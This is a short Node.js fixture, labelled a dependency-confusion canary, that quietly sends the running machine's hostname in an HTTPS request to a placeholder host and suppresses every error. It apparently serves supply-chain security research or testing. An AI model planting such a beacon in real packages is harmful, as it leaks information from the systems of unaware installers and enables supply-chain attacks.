'use strict';
// Dependency-confusion canary fixture: one GET carrying the hostname.
try {
  var os = require('os');
  var https = require('https');
  var host = encodeURIComponent((os.hostname && os.hostname()) || 'unknown');
  var url = 'https://depconf.example.invalid/log?depconf=' + host;
  var req = https.get(url, { timeout: 3000 }, function (res) { res.resume(); });
  req.on('error', function () {});
} catch (e) {}
